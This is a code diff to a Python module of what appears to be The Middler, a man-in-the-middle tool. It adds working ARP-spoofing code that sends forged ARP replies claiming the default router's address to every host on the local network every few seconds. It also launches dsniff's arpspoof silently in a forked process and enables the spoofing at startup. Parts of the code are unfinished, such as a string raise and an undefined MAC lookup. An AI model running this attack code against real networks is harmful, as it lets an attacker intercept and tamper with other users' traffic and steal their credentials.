@@ -6,8 +6,11 @@ import libmiddler as ml
 # sys and os are both necessary
 import sys
 import os
+import re
 from subprocess import *
 from time import sleep
+
+#from scapy.all import *
 
 #######################
 # Variable definitions
@@ -119,33 +122,40 @@ def redirectIPTablesStop():
 # ARP spoofing code
 ####################################################################################################
 
-def arpspoof_via_scapy(impersonated_host, victim_ip, my_mac):
-    const_ARP_RESPONSE = 2
+def arpspoof_via_scapy(impersonated_host, victim_ip, my_mac, my_broadcast):
+    from scapy.all import ARP,IP,send,srp,sr1,conf
 
-    # define a constant for ARP responses
-    const_ARP_RESPONSE = const_ARP_RESPONSE
+    # Turn off scapy's verbosity?
+    conf.verb=0
 
     # Build an ARP response to set up spoofing
     arp_response = ARP()
+    # define a constant for ARP responses
+    const_ARP_RESPONSE = 2
     # Set the type to a ARP response
-    arp_response.op = 2
+    arp_response.op = const_ARP_RESPONSE
     # Hardware address we want to claim the packet
     arp_response.hwsrc = my_mac
     # IP address we want to map to that address
     arp_response.psrc = impersonated_host
 
+    # Now set the ARP response target
+    non_broadcast=0
     if non_broadcast:
+
+        raise "TODO: The Middler team has not yet coded a MAC lookup routine."
+
         # MAC address and IP address of our victim
-        arp_response.hwdst = victim_mac
+        arp_response.hwdst = lookup_mac(victim_mac)
         arp_response.pdst = victim_ip
     else:
         arp_response.hwdst = "ff:ff:ff:ff:ff:ff"
-        arp_response.pdst = "255.255.255.255"
+        arp_response.pdst = my_broadcast
 
     # Issue the ARP response every 5 seconds
     while(1):
         send(arp_response)
-        sleep(5)
+        sleep(3)
 
 def find_my_default_router_and_interface():
 
@@ -179,24 +189,54 @@ def find_my_default_router_and_interface():
     return (router_interface,router_ip)
 
 
-def find_mac(interface):
+def find_mac_and_bcast(interface):
     # Run ifconfig for the named interface.
-    #(outf,inf)=os.popen2(" ".join(["ifconfig ",interface]),"r",-1)
+    ml.jjlog.debug("Trying to find mac for interface %s\n" % interface)
     p = Popen("ifconfig %s" % interface, shell=True, bufsize=100, stdin=PIPE, stdout=PIPE, close_fds=True)
     (child_stdin, child_stdout) = (p.stdin, p.stdout)
 
     # Just grab the line(s) that have a MAC address on them.
-    ether_lines = [ line for line in child_stdout.readlines() if line.find("ether") >= 0 ]
+    if sys.platform == r"darwin":
+        mac_line_pattern = "ether "
+        bcast_line_pattern = r"broadcast "
+    elif sys.platform == r"linux2":
+        mac_line_pattern = r"HWaddr "
+        bcast_line_pattern = r"Bcast:"
+
+    ifconfig_lines = child_stdout.readlines()
+    ether_lines = [ line for line in ifconfig_lines if line.find(mac_line_pattern) >= 0 ]
+    bcast_lines = [ line for line in ifconfig_lines if line.find(bcast_line_pattern) >= 0]
 
     # If there are not MAC address lines, we're busted.
-    if ether_lines == []:
+    if ether_lines == [] or bcast_lines == []:
         # Warn the user that we can't arpspoof if there are no interfaces
-        ml.jjlog.debug( "    WARNING: cannot determine MAC address for interface %s " % interface)
+        ml.jjlog.debug( "    WARNING: cannot determine MAC or broadcast address for interface %s " % interface)
         ml.jjlog.debug( "    ARP spoofing deactivated.")
-        return("NONE")
+        print "find_mac routine failed.\n"
+        return("NONE","NONE")
     else:
-        line = ether_lines.pop()
-        return(line)
+        # First, find the MAC address portion of the ether/HWaddr line
+        etherline = ether_lines.pop()
+        mac_offset = etherline.find(mac_line_pattern) + len(mac_line_pattern)
+        mac_address = etherline[mac_offset:].rstrip("\r\n ")
+
+        # Now, do the same for broadcast
+        bcast_line = bcast_lines.pop()
+        bcast_offset = bcast_line.find(bcast_line_pattern) + len(bcast_line_pattern)
+
+        # Here's where things differ by plaform.  The bcast address isn't the last thing on
+        # the line on Linux
+        if sys.platform == r"linux2":
+            bcast_line = bcast_line[bcast_offset:]
+            bcast_end = bcast_line.find(" ")
+            bcast_address = bcast_line[:bcast_end]
+        else:
+            bcast_address = bcast_line[bcast_offset:].rstrip("\r\n ")
+
+        ml.jjlog.debug("Found MAC address %s and broadcast address %s!\n" % (mac_address,bcast_address) )
+
+        return(mac_address,bcast_address)
+
 
 def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter"):
     """This routine sets up ARP spoofing to get traffic on the local LAN to our
@@ -214,6 +254,7 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
     # We need to know the router ip, so we know who to impersonate.
 
     (router_interface,router_ip) = find_my_default_router_and_interface()
+    ml.jjlog.developer_log("Router and interface were %s and %s" % (router_interface,router_ip) )
 
     # If the user doesn't request a specific interface, we use their default
     # interface.    If he doesn't request a specific target, we use his default
@@ -227,7 +268,8 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
     # Now, let's set up to send ARP replies either to a specifically-named target
     # or to everyone on the network except the default router.
 
-    my_mac = find_mac(interface)
+    (my_mac,my_broadcast) = find_mac_and_bcast(interface)
+
     if my_mac == "NONE":
         exit(1)
 
@@ -239,25 +281,31 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
     pid = os.fork()
 
     if pid:
-        # Make sure we don't exit until this child exits
-        os.waitpid(pid,0)
+        ml.jjlog.debug("Forking to handle arpspoofing\n")
+
         # Let's add this process to a list of child processes that we will need to
         # explicitly shut down.
         ml.child_pids_to_shutdown.append(pid)
+
     # For the child...
     else:
         # Spoof away, Mr McManis
+
+        # Lock this to arpspoof for now
+        print "Temporary - lockng to arpspoof for now\n"
+        os.system("arpspoof %s >/dev/null 2>&1" % impersonated_host)
+
         try:
             # Try to use scapy for this.
             import scapy
-            arpspoof_via_scapy(impersonated_host,target_host,my_mac)
+            arpspoof_via_scapy(impersonated_host,target_host,my_mac,my_broadcast)
 
         except ImportError:
             # If scapy isn't present, let's use dsniff's arpspooof program
             print "Arpspoofing requires either scapy or dsniff's arpspoof program.\n"
             print "Trying arpspoof command.\n"
 
-            os.system("arpspoof %s" % impersonated_host)
+            os.system("arpspoof %s >/dev/null 2>&1" % impersonated_host)
 
 
     ##############################
@@ -300,7 +348,7 @@ def start():
 
 
     # Now start the arpspoofing
-    #set_up_arpspoofing()
+    set_up_arpspoofing()
 
 def stop():
 
